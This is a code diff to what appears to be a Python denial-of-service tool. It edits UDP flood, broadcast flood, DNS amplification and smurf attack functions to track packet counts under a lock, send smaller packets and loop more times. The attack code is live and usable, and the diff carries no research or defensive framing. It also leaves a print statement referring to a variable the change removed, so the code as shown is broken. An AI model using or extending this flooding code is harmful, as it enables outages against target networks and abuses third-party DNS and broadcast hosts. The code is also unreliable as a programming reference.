@@ -104,20 +104,17 @@ def network_wide_udp_flood(target_network, target_port, duration, threads_count)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
         sock.setblocking(False)
         
-        packet = random._urandom(65000)
-        local_count = 0
+        packet = random._urandom(1024)
         
         while not stop_event.is_set() and time.time() < end_time:
             for host in hosts:
                 try:
                     sock.sendto(packet, (str(host), target_port))
-                    local_count += 1
+                    with packet_lock:
+                        total_packets[0] += 1
                     if packet_tracker: packet_tracker(1)
                 except:
                     pass
-        
-        with packet_lock:
-            total_packets[0] += local_count
         sock.close()
     
     threads = []
@@ -153,25 +150,24 @@ def broadcast_udp_flood(target_network, target_port, duration, threads_count):
     end_time = time.time() + duration
     stop_event = threading.Event()
     total_packets = [0]
+    packet_lock = threading.Lock()
     
     def flood(thread_id):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
         
-        packet = random._urandom(65000)
-        local_count = 0
+        packet = random._urandom(1024) # smaller packet for better throughput/count tracking
         
         while not stop_event.is_set() and time.time() < end_time:
-            for _ in range(10):
+            for _ in range(100):
                 try:
                     sock.sendto(packet, (broadcast_ip, target_port))
-                    local_count += 1
+                    with packet_lock:
+                        total_packets[0] += 1
                     if packet_tracker: packet_tracker(1)
                 except:
                     pass
-        
-        total_packets[0] += local_count
         sock.close()
     
     threads = []
@@ -204,6 +200,7 @@ def dns_amplification_attack(target_ip, duration, threads_count):
     end_time = time.time() + duration
     stop_event = threading.Event()
     total_packets = [0]
+    packet_lock = threading.Lock()
     
     def flood(thread_id):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -211,18 +208,15 @@ def dns_amplification_attack(target_ip, duration, threads_count):
         
         query = bytes.fromhex("00000100000100000000000003777777066e6574666c7803636f6d0000010001")
         
-        local_count = 0
-        
         while not stop_event.is_set() and time.time() < end_time:
             for dns in dns_servers:
                 try:
                     sock.sendto(query, (dns, 53))
-                    local_count += 1
+                    with packet_lock:
+                        total_packets[0] += 1
                     if packet_tracker: packet_tracker(1)
                 except:
                     pass
-        
-        total_packets[0] += local_count
         sock.close()
     
     threads = []
@@ -468,8 +462,6 @@ def smurf_attack(target_ip, duration, threads_count):
     packet_lock = threading.Lock()
     
     def flood(thread_id):
-        local_count = 0
-        
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -481,18 +473,15 @@ def smurf_attack(target_ip, duration, threads_count):
         
         while not stop_event.is_set() and time.time() < end_time:
             for bc_ip in broadcast_ips:
-                for _ in range(5):
+                for _ in range(10):
                     try:
                         sock.sendto(packet, (bc_ip, 0))
-                        local_count += 1
+                        with packet_lock:
+                            total_packets[0] += 1
                         if packet_tracker: packet_tracker(1)
                     except:
                         pass
-        
         sock.close()
-        
-        with packet_lock:
-            total_packets[0] += local_count
         
         print(f"[*] Thread {thread_id} finished - sent {local_count:,} packets")
     
